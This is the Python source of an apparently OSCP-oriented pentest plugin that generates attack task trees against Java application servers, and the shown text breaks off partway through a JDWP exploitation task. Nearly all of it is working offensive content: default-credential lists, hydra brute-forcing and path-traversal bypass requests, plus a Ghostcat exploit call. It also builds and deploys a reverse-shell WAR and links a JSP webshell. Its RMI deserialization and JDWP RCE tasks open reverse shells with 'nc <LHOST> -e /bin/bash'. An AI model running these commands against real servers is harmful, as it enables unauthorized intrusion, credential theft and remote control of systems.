"""
Java Application Server enumeration plugin (Tomcat, JBoss, WebLogic, GlassFish)

Generates tasks for Java application server enumeration including:
- Version fingerprinting and technology detection
- Default credential testing (manager interfaces)
- Path traversal and authentication bypass vulnerabilities
- WAR file deployment for RCE
- JMX/RMI exploitation
- Java deserialization attacks

Covers: Apache Tomcat, JBoss/WildFly, WebLogic, GlassFish, Apache TomEE

Extracted from HackTricks:
- network-services-pentesting/pentesting-web/tomcat/README.md
- network-services-pentesting/pentesting-web/jboss.md
- network-services-pentesting/1099-pentesting-java-rmi.md
- network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol.md
- network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class JavaAppServerPlugin(ServicePlugin):
    """Java Application Server (Tomcat, JBoss, etc.) enumeration plugin"""

    @property
    def name(self) -> str:
        return "java-app-server"

    @property
    def default_ports(self) -> List[int]:
        return [8080, 8443, 8009, 8180, 8009, 9080, 9443]

    @property
    def service_names(self) -> List[str]:
        return [
            'tomcat', 'apache-tomcat', 'http-proxy',
            'jboss', 'wildfly',
            'weblogic', 'glassfish', 'tomee',
            'ajp', 'ajp13', 'java-rmi', 'jdwp'
        ]

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect Java application servers"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        port = port_info.get('port')

        # Check service name for Java server indicators
        if any(svc in service for svc in self.service_names):
            return True

        # Check product field
        if any(prod in product for prod in ['tomcat', 'jboss', 'weblogic', 'glassfish']):
            return True

        # Check version string for Java server indicators
        if any(ver in version for ver in ['tomcat', 'jboss']):
            return True

        # Check common Java app server ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Java application server enumeration task tree"""
        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'Java Server')
        service = service_info.get('service', '').lower()

        # Determine protocol and service type
        is_https = port in [8443, 9443] or 'https' in service
        protocol = 'https' if is_https else 'http'
        url = f"{protocol}://{target}:{port}"

        # Detect specific server type
        server_type = self._detect_server_type(service, product, version)

        tasks = {
            'id': f'java-app-server-enum-{port}',
            'name': f'Java App Server Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: VERSION IDENTIFICATION ===
        tasks['children'].append({
            'id': f'java-version-{port}',
            'name': f'Version Identification ({server_type})',
            'type': 'parent',
            'children': [
                {
                    'id': f'curl-server-header-{port}',
                    'name': 'Check Server Headers',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -I {url}',
                        'description': 'Identify server version from HTTP headers',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-I': 'Fetch HTTP headers only (HEAD request), no body'
                        },
                        'success_indicators': [
                            'Server: Apache-Coyote/1.1 (Tomcat)',
                            'Server: JBoss-x.x',
                            'X-Powered-By: Servlet header present'
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'Server header stripped by reverse proxy'
                        ],
                        'next_steps': [
                            'Note exact version for CVE research',
                            'Check /docs/ for version documentation',
                            'Test for version-specific vulnerabilities'
                        ],
                        'alternatives': [
                            f'Manual: nc {target} {port}, then send: HEAD / HTTP/1.0\\n\\n',
                            f'Browser: View Network tab in DevTools',
                            f'whatweb {url} -v'
                        ],
                        'notes': 'Tomcat versions <6 more vulnerable. Default error pages reveal versions.'
                    }
                },
                {
                    'id': f'check-docs-{port}',
                    'name': 'Check Documentation Directory',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {url}/docs/ | grep -i "tomcat\\|version"',
                        'description': 'Extract version from documentation index page (Tomcat)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-s': 'Silent mode (no progress bar)',
                            'grep -i': 'Case-insensitive search for version strings'
                        },
                        'success_indicators': [
                            'Version found in <title> tag',
                            'Documentation page accessible'
                        ],
                        'failure_indicators': [
                            '404 Not Found (docs removed)',
                            '403 Forbidden (access restricted)'
                        ],
                        'alternatives': [
                            f'Browser: {url}/docs/',
                            f'curl {url}/RELEASE-NOTES.txt',
                            f'curl {url}/README.txt'
                        ],
                        'notes': 'Common on Tomcat. Try /docs/, /examples/, /manager/html'
                    }
                }
            ]
        })

        # === PHASE 2: MANAGER INTERFACE DISCOVERY ===
        manager_tasks = self._create_manager_enumeration_tasks(target, port, url, server_type)
        if manager_tasks:
            tasks['children'].append(manager_tasks)

        # === PHASE 3: DEFAULT CREDENTIALS ===
        tasks['children'].append(self._create_default_creds_tasks(target, port, url, server_type))

        # === PHASE 4: VULNERABILITY TESTING ===
        vuln_tasks = self._create_vulnerability_tasks(target, port, url, server_type, version)
        if vuln_tasks:
            tasks['children'].append(vuln_tasks)

        # === PHASE 5: EXPLOITATION (WAR DEPLOYMENT) ===
        if 'tomcat' in server_type.lower():
            tasks['children'].append(self._create_war_deployment_tasks(target, port, url))

        # === PHASE 6: JAVA-SPECIFIC ATTACKS ===
        if port in [1099, 8009, 8000, 8787, 5005] or 'rmi' in service or 'ajp' in service or 'jdwp' in service:
            java_tasks = self._create_java_specific_tasks(target, port, service)
            if java_tasks:
                tasks['children'].append(java_tasks)

        # === PHASE 7: POST-EXPLOITATION ===
        tasks['children'].append({
            'id': f'java-post-exploit-{port}',
            'name': 'Post-Exploitation Research',
            'type': 'parent',
            'children': [
                {
                    'id': f'tomcat-users-{port}',
                    'name': 'Locate tomcat-users.xml',
                    'type': 'manual',
                    'metadata': {
                        'command': 'find / -name tomcat-users.xml 2>/dev/null',
                        'description': 'Find Tomcat credentials file (if LFI/RCE obtained)',
                        'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                        'flag_explanations': {
                            '-name': 'Search for exact filename',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'success_indicators': [
                            'Found: /usr/share/tomcat9/etc/tomcat-users.xml',
                            'Credentials extracted from XML'
                        ],
                        'alternatives': [
                            'cat /usr/share/tomcat9/etc/tomcat-users.xml',
                            'cat /var/lib/tomcat9/conf/tomcat-users.xml',
                            'locate tomcat-users.xml'
                        ],
                        'notes': 'Typical locations: /etc/tomcat*, /usr/share/tomcat*, /opt/tomcat/conf/'
                    }
                }
            ]
        })

        # === PHASE 8: EXPLOIT RESEARCH (if version known) ===
        if version and version != 'unknown':
            tasks['children'].append({
                'id': f'exploit-research-{port}',
                'name': f'Exploit Research: {product} {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-{port}',
                        'name': f'SearchSploit: {product} {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "{product} {version}"',
                            'description': 'Search ExploitDB for known exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'success_indicators': [
                                'Exploits found in local database',
                                'CVE references listed'
                            ],
                            'alternatives': [
                                f'Google: "{product} {version} exploit"',
                                f'Browse: https://www.exploit-db.com/',
                                'Check: https://github.com/rapid7/metasploit-framework'
                            ]
                        }
                    },
                    {
                        'id': f'cve-lookup-{port}',
                        'name': 'CVE Database Lookup',
                        'type': 'manual',
                        'metadata': {
                            'description': f'Search CVE databases for {product} {version}',
                            'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                            'alternatives': [
                                f'Browse: https://nvd.nist.gov/vuln/search',
                                f'Browse: https://cve.mitre.org/',
                                f'Google: "CVE {product} {version}"'
                            ]
                        }
                    }
                ]
            })

        return tasks

    def _detect_server_type(self, service: str, product: str, version: str) -> str:
        """Detect specific Java server type"""
        combined = f"{service} {product} {version}".lower()

        if 'tomcat' in combined:
            return 'Tomcat'
        elif 'jboss' in combined or 'wildfly' in combined:
            return 'JBoss/WildFly'
        elif 'weblogic' in combined:
            return 'WebLogic'
        elif 'glassfish' in combined:
            return 'GlassFish'
        elif 'tomee' in combined:
            return 'TomEE'
        else:
            return 'Java Application Server'

    def _create_manager_enumeration_tasks(self, target: str, port: int, url: str, server_type: str) -> Dict[str, Any]:
        """Create manager interface discovery tasks"""

        # Define manager paths by server type
        manager_paths = {
            'Tomcat': ['/manager/html', '/manager/text', '/host-manager', '/admin'],
            'JBoss/WildFly': ['/admin-console', '/jmx-console', '/management', '/web-console', '/web-console/ServerInfo.jsp'],
            'WebLogic': ['/console', '/console/login'],
            'GlassFish': ['/admin', '/common/login.jsf'],
            'default': ['/manager', '/admin', '/console']
        }

        paths = manager_paths.get(server_type, manager_paths['default'])

        return {
            'id': f'manager-discovery-{port}',
            'name': 'Manager Interface Discovery',
            'type': 'parent',
            'children': [
                {
                    'id': f'manual-manager-check-{port}',
                    'name': 'Manual Manager Path Check',
                    'type': 'manual',
                    'metadata': {
                        'description': f'Manually check common {server_type} manager paths',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            f'curl -I {url}{path}' for path in paths[:5]
                        ] + [
                            f'Browser: {url}{path}' for path in paths[:3]
                        ],
                        'success_indicators': [
                            '401 Unauthorized (auth required - interface exists!)',
                            '200 OK with login form',
                            '302 Redirect to login page'
                        ],
                        'failure_indicators': [
                            '404 Not Found (path may be custom/renamed)',
                            '403 Forbidden (IP whitelist)'
                        ],
                        'next_steps': [
                            'Note which paths respond with 401/200',
                            'Try default credentials',
                            'Attempt brute-force if necessary',
                            'Test for authentication bypass vulnerabilities'
                        ],
                        'notes': f'Common {server_type} paths: {", ".join(paths)}'
                    }
                },
                {
                    'id': f'gobuster-manager-{port}',
                    'name': 'Brute-force Manager Paths',
                    'type': 'command',
                    'metadata': {
                        'command': f'gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -s 200,401,403 -o manager_paths_{port}.txt',
                        'description': 'Find renamed/custom manager interfaces',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                        'flag_explanations': {
                            'dir': 'Directory brute-force mode',
                            '-u': 'Target URL',
                            '-w': 'Wordlist (common.txt for speed)',
                            '-s': 'Status codes to display (200 OK, 401 Auth, 403 Forbidden)',
                            '-o': 'Output file for documentation'
                        },
                        'success_indicators': [
                            'Manager paths found with 401 status',
                            'Admin panels discovered'
                        ],
                        'alternatives': [
                            f'feroxbuster -u {url} -w /usr/share/wordlists/dirb/common.txt',
                            f'ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403'
                        ],
                        'notes': 'Focus on 401 responses - they indicate auth-protected paths'
                    }
                }
            ]
        }

    def _create_default_creds_tasks(self, target: str, port: int, url: str, server_type: str) -> Dict[str, Any]:
        """Create default credentials testing tasks"""

        # Default credentials by server type
        default_creds = {
            'Tomcat': [
                'admin:admin', 'tomcat:tomcat', 'admin:tomcat',
                'admin:s3cr3t', 'tomcat:s3cr3t', 'admin:', 'admin:password'
            ],
            'JBoss/WildFly': [
                'admin:admin', 'jboss:jboss', 'admin:',
                'admin:password', 'manager:manager'
            ],
            'WebLogic': [
                'weblogic:weblogic', 'system:password', 'admin:admin'
            ],
            'GlassFish': [
                'admin:admin', 'admin:adminadmin', 'admin:'
            ]
        }

        creds = default_creds.get(server_type, default_creds['Tomcat'])

        return {
            'id': f'default-creds-{port}',
            'name': 'Default Credentials Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'manual-creds-{port}',
                    'name': 'Manual Credential Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': f'Test {server_type} default credentials manually',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            f'curl -u {cred} {url}/manager/html' for cred in creds[:3]
                        ] + [
                            f'Browser: Try login with {cred}' for cred in creds[:3]
                        ],
                        'success_indicators': [
                            '200 OK (authentication successful!)',
                            'Manager interface accessed',
                            'No 401 Unauthorized error'
                        ],
                        'failure_indicators': [
                            '401 Unauthorized (wrong credentials)',
                            'Account lockout after multiple attempts'
                        ],
                        'next_steps': [
                            'If successful: proceed to WAR deployment',
                            'If failed: try brute-force with hydra',
                            'Check for authentication bypass vulnerabilities'
                        ],
                        'notes': f'Common {server_type} defaults: {", ".join(creds[:5])}'
                    }
                },
                {
                    'id': f'metasploit-creds-{port}',
                    'name': 'Metasploit Login Scanner',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS {target}; set RPORT {port}; set STOP_ON_SUCCESS true; run; exit"',
                        'description': 'Automated Tomcat manager credential testing',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'flag_explanations': {
                            '-q': 'Quiet mode (suppress banner)',
                            '-x': 'Execute commands and exit',
                            'STOP_ON_SUCCESS': 'Stop scanning after first valid credential'
                        },
                        'success_indicators': [
                            '[+] Login Successful',
                            'Valid credentials found'
                        ],
                        'failure_indicators': [
                            'No credentials found',
                            'Module not compatible with target'
                        ],
                        'alternatives': [
                            f'hydra -C /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt {target} -s {port} http-get /manager/html',
                            'Manual testing with curl'
                        ],
                        'notes': 'Metasploit has built-in Tomcat credential wordlist'
                    }
                },
                {
                    'id': f'hydra-brute-{port}',
                    'name': 'Credential Brute-force',
                    'type': 'command',
                    'metadata': {
                        'command': f'hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_usernames.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -f {target} -s {port} http-get /manager/html',
                        'description': 'Brute-force Tomcat manager credentials (noisy, slow)',
                        'tags': ['OSCP:MEDIUM', 'NOISY', 'BRUTE_FORCE'],
                        'flag_explanations': {
                            '-L': 'Username list',
                            '-P': 'Password list',
                            '-f': 'Stop after first successful login',
                            '-s': 'Port number',
                            'http-get': 'HTTP GET request with Basic Auth'
                        },
                        'success_indicators': [
                            '[80][http-get] host: X.X.X.X login: admin password: admin',
                            'Valid credentials found'
                        ],
                        'failure_indicators': [
                            'No valid credentials found',
                            'Account lockout triggered',
                            'Rate limiting detected'
                        ],
                        'alternatives': [
                            'Metasploit tomcat_mgr_login module',
                            'Manual testing with smaller wordlist'
                        ],
                        'notes': 'CAUTION: Brute-forcing may lock accounts or trigger IDS. Try defaults first!',
                        'estimated_time': '5-15 minutes depending on wordlist size'
                    }
                }
            ]
        }

    def _create_vulnerability_tasks(self, target: str, port: int, url: str, server_type: str, version: str) -> Dict[str, Any]:
        """Create vulnerability-specific testing tasks"""

        tasks = {
            'id': f'vuln-testing-{port}',
            'name': 'Vulnerability Testing',
            'type': 'parent',
            'children': []
        }

        # === TOMCAT-SPECIFIC VULNERABILITIES ===
        if 'tomcat' in server_type.lower():
            # Path traversal vulnerabilities
            tasks['children'].append({
                'id': f'path-traversal-{port}',
                'name': 'Path Traversal Testing',
                'type': 'parent',
                'children': [
                    {
                        'id': f'dotdot-semicolon-{port}',
                        'name': 'Test /..;/ Bypass',
                        'type': 'command',
                        'metadata': {
                            'command': f'curl -I {url}/..;/manager/html',
                            'description': 'Test path traversal to access protected /manager directory',
                            'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                            'flag_explanations': {
                                '/..;/': 'Path traversal using semicolon bypass (Tomcat-specific)',
                                '-I': 'HEAD request only (check response code)'
                            },
                            'success_indicators': [
                                '200 OK (bypass successful!)',
                                '401 Unauthorized (path exists, needs auth)',
                                'Manager page accessible'
                            ],
                            'failure_indicators': [
                                '404 Not Found (vulnerability not present)',
                                '403 Forbidden (different protection)'
                            ],
                            'next_steps': [
                                'Try accessing: /..;/manager/html',
                                'Try: /;param=value/manager/html',
                                'If accessible, proceed with manager exploitation'
                            ],
                            'alternatives': [
                                f'curl {url}/;param=value/manager/html',
                                f'Browser: {url}/..;/manager/html',
                                f'Test other paths: /..;/admin, /..;/host-manager'
                            ],
                            'notes': 'CVE-2007-1860 (mod_jk), affects some Tomcat reverse proxy configs'
                        }
                    },
                    {
                        'id': f'double-encoding-{port}',
                        'name': 'Double URL Encoding',
                        'type': 'command',
                        'metadata': {
                            'command': f'curl -I {url}/%252E%252E/manager/html',
                            'description': 'Test double URL encoding path traversal (CVE-2007-1860)',
                            'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                            'flag_explanations': {
                                '%252E%252E': 'Double-encoded ".." (%2E encoded twice)',
                                '-I': 'HEAD request to check response'
                            },
                            'success_indicators': [
                                '200 OK or 401 (path traversal successful)',
                                'Manager interface accessed'
                            ],
                            'failure_indicators': [
                                '404 Not Found',
                                'Path not decoded correctly'
                            ],
                            'alternatives': [
                                f'curl {url}/%252E%252E/admin',
                                f'Try: {url}/%2e%2e/manager/html (single encoding)'
                            ],
                            'notes': 'mod_jk vulnerability in older Tomcat versions'
                        }
                    }
                ]
            })

            # Example pages (info disclosure)
            tasks['children'].append({
                'id': f'examples-enum-{port}',
                'name': 'Example Pages Enumeration',
                'type': 'manual',
                'metadata': {
                    'description': 'Check Tomcat example pages (info disclosure, XSS)',
                    'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                    'alternatives': [
                        f'curl {url}/examples/jsp/snp/snoop.jsp',
                        f'curl {url}/examples/servlets/servlet/SessionExample',
                        f'Browser: {url}/examples/'
                    ],
                    'success_indicators': [
                        'Example pages accessible',
                        'Server info disclosed',
                        'Session data exposed'
                    ],
                    'next_steps': [
                        'Check: /examples/jsp/snp/snoop.jsp (server info)',
                        'Check: /examples/servlet/SessionExample (session data)',
                        'Look for XSS in example forms'
                    ],
                    'notes': 'Tomcat 4.x-7.x include vulnerable example scripts. Check all paths listed in HackTricks.'
                }
            })

            # auth.jsp password disclosure
            tasks['children'].append({
                'id': f'auth-jsp-{port}',
                'name': 'Password Backtrace Disclosure',
                'type': 'command',
                'metadata': {
                    'command': f'curl {url}/auth.jsp',
                    'description': 'Check for password disclosure in backtrace (rare)',
                    'tags': ['OSCP:LOW', 'QUICK_WIN'],
                    'success_indicators': [
                        'Backtrace visible',
                        'Credentials in stack trace'
                    ],
                    'failure_indicators': [
                        '404 Not Found',
                        'No backtrace present'
                    ],
                    'notes': 'Rare vulnerability, but quick to check'
                }
            })

        # === JBOSS-SPECIFIC VULNERABILITIES ===
        if 'jboss' in server_type.lower():
            tasks['children'].append({
                'id': f'jboss-vuln-scan-{port}',
                'name': 'JBoss Vulnerability Scanner',
                'type': 'command',
                'metadata': {
                    'command': f'msfconsole -q -x "use auxiliary/scanner/http/jboss_vulnscan; set RHOSTS {target}; set RPORT {port}; run; exit"',
                    'description': 'Automated JBoss vulnerability scanner (Metasploit)',
                    'tags': ['OSCP:HIGH', 'AUTOMATED'],
                    'flag_explanations': {
                        'jboss_vulnscan': 'Scans for common JBoss vulnerabilities and misconfigurations'
                    },
                    'success_indicators': [
                        'Vulnerabilities detected',
                        'Exposed management interfaces',
                        'Deserialization endpoints found'
                    ],
                    'alternatives': [
                        f'python3 jexboss.py -u {url}',
                        'Manual checks: /web-console/ServerInfo.jsp, /status?full=true'
                    ],
                    'notes': 'JexBoss tool: https://github.com/joaomatosf/jexboss'
                }
            })

        # === AJP GHOSTCAT (CVE-2020-1938) ===
        if port == 8009 or 'ajp' in server_type.lower():
            tasks['children'].append({
                'id': f'ghostcat-{port}',
                'name': 'Ghostcat LFI (CVE-2020-1938)',
                'type': 'command',
                'metadata': {
                    'command': f'python3 /usr/share/exploitdb/exploits/multiple/webapps/48143.py {target} {port} /WEB-INF/web.xml',
                    'description': 'Test for Ghostcat LFI vulnerability (read WEB-INF/web.xml)',
                    'tags': ['OSCP:HIGH', 'EXPLOIT'],
                    'flag_explanations': {
                        '/WEB-INF/web.xml': 'Target file to read (contains credentials, configs)'
                    },
                    'success_indicators': [
                        'web.xml contents retrieved',
                        'Credentials found in XML',
                        'Application configuration exposed'
                    ],
                    'failure_indicators': [
                        'Connection refused (AJP not exposed)',
                        'Error reading file (patched version)'
                    ],
                    'next_steps': [
                        'Extract credentials from web.xml',
                        'Read other files: /etc/passwd, /WEB-INF/classes/',
                        'Use creds to access manager interface'
                    ],
                    'alternatives': [
                        'Search: searchsploit ghostcat',
                        'Use: https://github.com/chompie1337/tomcat_bof_poc'
                    ],
                    'notes': 'Affects Tomcat 9.0.0.M1-9.0.0.30, 8.5.0-8.5.50, 7.0.0-7.0.99. Patched in: 9.0.31, 8.5.51, 7.0.100'
                }
            })

        return tasks if tasks['children'] else None

    def _create_war_deployment_tasks(self, target: str, port: int, url: str) -> Dict[str, Any]:
        """Create WAR file deployment tasks for RCE"""

        return {
            'id': f'war-deployment-{port}',
            'name': 'WAR File Deployment (RCE)',
            'type': 'parent',
            'children': [
                {
                    'id': f'msfvenom-war-{port}',
                    'name': 'Generate Malicious WAR',
                    'type': 'command',
                    'metadata': {
                        'command': 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o revshell.war',
                        'description': 'Create WAR file with JSP reverse shell',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '-p': 'Payload type (Java JSP reverse shell)',
                            'LHOST': 'Attacker IP (your VPN IP)',
                            'LPORT': 'Attacker listening port (e.g., 4444)',
                            '-f war': 'Output format (Web Application Archive)',
                            '-o': 'Output filename'
                        },
                        'success_indicators': [
                            'Created revshell.war file',
                            'File size ~2-5KB'
                        ],
                        'next_steps': [
                            'Start listener: nc -lvnp <LPORT>',
                            'Upload WAR via manager interface',
                            'Access: http://target:port/revshell/',
                            'Catch reverse shell'
                        ],
                        'alternatives': [
                            'Manual JSP shell: Create index.jsp with cmd.jsp webshell',
                            'Use tomcatWarDeployer.py tool',
                            'Use clusterd tool'
                        ],
                        'notes': 'Requires manager-script, manager-gui, or admin role'
                    }
                },
                {
                    'id': f'curl-war-deploy-{port}',
                    'name': 'Deploy WAR via curl',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl --upload-file revshell.war -u "USERNAME:PASSWORD" "{url}/manager/text/deploy?path=/revshell"',
                        'description': 'Deploy WAR file to Tomcat manager via HTTP API',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '--upload-file': 'Upload local file to server',
                            '-u': 'Basic authentication (username:password)',
                            'path=/revshell': 'Web application context path'
                        },
                        'success_indicators': [
                            'OK - Deployed application',
                            'Application appears in manager list'
                        ],
                        'failure_indicators': [
                            'FAIL - Application already exists',
                            '401 Unauthorized (wrong credentials)',
                            '403 Forbidden (insufficient privileges)'
                        ],
                        'next_steps': [
                            'Start listener: nc -lvnp <LPORT>',
                            f'Trigger shell: curl {url}/revshell/',
                            'Catch reverse shell',
                            'Undeploy after: curl -u USER:PASS {url}/manager/text/undeploy?path=/revshell'
                        ],
                        'alternatives': [
                            'Upload via web GUI: /manager/html',
                            'Use Metasploit: exploit/multi/http/tomcat_mgr_upload',
                            'Use tomcatWarDeployer.py'
                        ],
                        'notes': 'Replace USERNAME:PASSWORD with valid credentials. Start nc listener BEFORE deployment!'
                    }
                },
                {
                    'id': f'metasploit-war-upload-{port}',
                    'name': 'Metasploit WAR Upload',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target}; set RPORT {port}; set HttpUsername admin; set HttpPassword admin; set LHOST <LHOST>; set LPORT <LPORT>; run"',
                        'description': 'Automated WAR upload and exploitation via Metasploit',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED'],
                        'flag_explanations': {
                            'tomcat_mgr_upload': 'Module that uploads and deploys malicious WAR',
                            'HttpUsername': 'Manager username',
                            'HttpPassword': 'Manager password',
                            'LHOST': 'Attacker IP for reverse shell',
                            'LPORT': 'Attacker port for reverse shell'
                        },
                        'success_indicators': [
                            '[*] Started reverse TCP handler',
                            '[*] Meterpreter session opened',
                            'Shell access obtained'
                        ],
                        'failure_indicators': [
                            'Login failed (wrong credentials)',
                            'Upload failed (insufficient privileges)',
                            'Connection timeout'
                        ],
                        'alternatives': [
                            'Manual curl deployment',
                            'tomcatWarDeployer.py script',
                            'Manual web GUI upload'
                        ],
                        'notes': 'Set credentials found from earlier enumeration. Requires manager-script or admin role.'
                    }
                },
                {
                    'id': f'manual-webshell-{port}',
                    'name': 'Manual JSP Webshell',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create and deploy JSP webshell manually',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            '1. Create index.jsp with cmd.jsp code',
                            '2. Package: jar -cvf webshell.war index.jsp',
                            '3. Upload via /manager/html GUI',
                            '4. Access: http://target:port/webshell/',
                            '5. Execute commands via web form'
                        ],
                        'success_indicators': [
                            'Webshell accessible',
                            'Commands execute successfully'
                        ],
                        'notes': 'JSP webshell code: https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        }

    def _create_java_specific_tasks(self, target: str, port: int, service: str) -> Dict[str, Any]:
        """Create Java RMI, JDWP, and AJP-specific tasks"""

        tasks = {
            'id': f'java-protocols-{port}',
            'name': 'Java Protocol Exploitation',
            'type': 'parent',
            'children': []
        }

        # === JAVA RMI (port 1099, 1098, etc.) ===
        if port in [1090, 1098, 1099, 1199] or 'rmi' in service:
            tasks['children'].append({
                'id': f'rmi-enum-{port}',
                'name': 'Java RMI Enumeration',
                'type': 'parent',
                'children': [
                    {
                        'id': f'rmg-enum-{port}',
                        'name': 'RMI Registry Enumeration',
                        'type': 'command',
                        'metadata': {
                            'command': f'rmg enum {target} {port}',
                            'description': 'Enumerate RMI registry, bound names, vulnerabilities',
                            'tags': ['OSCP:HIGH', 'AUTOMATED'],
                            'flag_explanations': {
                                'enum': 'Enumeration action (scans for RMI vulnerabilities)',
                                target: 'Target hostname/IP',
                                str(port): 'RMI registry port'
                            },
                            'success_indicators': [
                                'Bound names listed',
                                'Known vulnerable classes found (JMX, Activation System)',
                                'CVE-2019-2684 vulnerable',
                                'Codebase enumeration successful'
                            ],
                            'failure_indicators': [
                                'Connection refused (RMI not exposed)',
                                'No bound names (empty registry)'
                            ],
                            'next_steps': [
                                'Note bound names and ObjIDs',
                                'Check for JMX interfaces (RCE via MLet)',
                                'Attempt method guessing',
                                'Test deserialization attacks'
                            ],
                            'alternatives': [
                                f'nmap --script rmi-dumpregistry -p {port} {target}',
                                'Manual: ysoserial + RMI client'
                            ],
                            'notes': 'Tool: remote-method-guesser (https://github.com/qtc-de/remote-method-guesser)'
                        }
                    },
                    {
                        'id': f'rmg-guess-{port}',
                        'name': 'RMI Method Guessing',
                        'type': 'command',
                        'metadata': {
                            'command': f'rmg guess {target} {port}',
                            'description': 'Brute-force method signatures on RMI services',
                            'tags': ['OSCP:MEDIUM', 'AUTOMATED'],
                            'flag_explanations': {
                                'guess': 'Method signature guessing action (brute-force)'
                            },
                            'success_indicators': [
                                'Methods discovered',
                                'Dangerous methods found (execute, system, eval)'
                            ],
                            'next_steps': [
                                'Call discovered methods with rmg call',
                                'Test for deserialization in method parameters',
                                'Attempt RCE via dangerous methods'
                            ],
                            'alternatives': [
                                'rmiscout tool',
                                'Manual signature testing'
                            ],
                            'notes': 'Uses wordlists: rmg.txt, rmiscout.txt. Can take 10-30 minutes.',
                            'estimated_time': '10-30 minutes'
                        }
                    },
                    {
                        'id': f'rmg-serial-{port}',
                        'name': 'RMI Deserialization Attack',
                        'type': 'command',
                        'metadata': {
                            'command': 'rmg serial <TARGET> <PORT> CommonsCollections6 \'<COMMAND>\' --bound-name <NAME> --signature "<METHOD>"',
                            'description': 'Java deserialization attack via RMI',
                            'tags': ['OSCP:HIGH', 'EXPLOIT'],
                            'flag_explanations': {
                                'serial': 'Deserialization attack action',
                                'CommonsCollections6': 'Ysoserial gadget chain',
                                '--bound-name': 'Target RMI bound name from enumeration',
                                '--signature': 'Method signature to exploit'
                            },
                            'success_indicators': [
                                'Server attempted to deserialize canary class',
                                'Deserialization attack probably worked',
                                'Reverse shell received'
                            ],
                            'next_steps': [
                                'Set up listener: nc -lvnp 4444',
                                'Execute command: nc <LHOST> 4444 -e /bin/bash',
                                'Try different gadget chains if failed'
                            ],
                            'alternatives': [
                                'ysoserial + manual RMI client',
                                'Metasploit: exploit/multi/misc/java_rmi_server'
                            ],
                            'notes': 'Requires method with Object parameter. Common gadgets: CommonsCollections[1-6], Groovy1'
                        }
                    }
                ]
            })

        # === JDWP (Java Debug Wire Protocol, port 8000) ===
        if port in [8000, 8787, 5005] or 'jdwp' in service:
            tasks['children'].append({
                'id': f'jdwp-exploit-{port}',
                'name': 'JDWP Exploitation',
                'type': 'parent',
                'children': [
                    {
                        'id': f'jdwp-handshake-{port}',
                        'name': 'JDWP Handshake Test',
                        'type': 'command',
                        'metadata': {
                            'command': f'echo "JDWP-Handshake" | nc {target} {port}',
                            'description': 'Verify JDWP service (should echo back "JDWP-Handshake")',
                            'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                            'success_indicators': [
                                'JDWP-Handshake echoed back',
                                'JDWP service confirmed'
                            ],
                            'failure_indicators': [
                                'Connection refused',
                                'No response or different response'
                            ],
                            'next_steps': [
                                'Proceed with jdwp-shellifier exploitation',
                                'Expect RCE - no authentication required!'
                            ],
                            'notes': 'JDWP has NO authentication - instant RCE if exposed!'
                        }
                    },
                    {
                        'id': f'jdwp-shellifier-{port}',
                        'name': 'JDWP RCE Exploitation',
                        'type': 'command',
                        'metadata': {
                            'command': f'python3 jdwp-shellifier.py -t {target} -p {port} --break-on "java.lang.String.indexOf" --cmd "nc <LHOST> <LPORT> -e /bin/bash"',
                            'description': 'Execute commands via JDWP (unauthenticated RCE)',
